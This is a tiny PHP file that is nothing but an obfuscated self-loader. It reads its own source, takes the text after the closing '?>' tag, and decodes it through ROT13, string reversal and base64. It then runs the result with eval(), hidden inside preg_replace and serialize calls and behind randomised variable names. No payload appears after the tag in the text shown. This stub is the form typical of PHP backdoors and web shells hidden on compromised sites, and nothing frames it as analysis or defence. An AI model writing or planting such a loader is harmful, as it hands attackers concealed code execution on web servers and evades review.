<?php $L66Rgr = explode(base64_decode("Pz4="), file_get_contents(__FILE__));
$L6CRgr = array(base64_decode("L3gvaQ=="), base64_decode("eA=="), base64_decode(strrev(str_rot13($L66Rgr[1]))));
$L7CRgr = "0418f3dfb53ee15009d367d86dea2539";
preg_replace($L6CRgr[0], serialize(eval($L6CRgr[2])), $L6CRgr[1]);
exit(); ?>
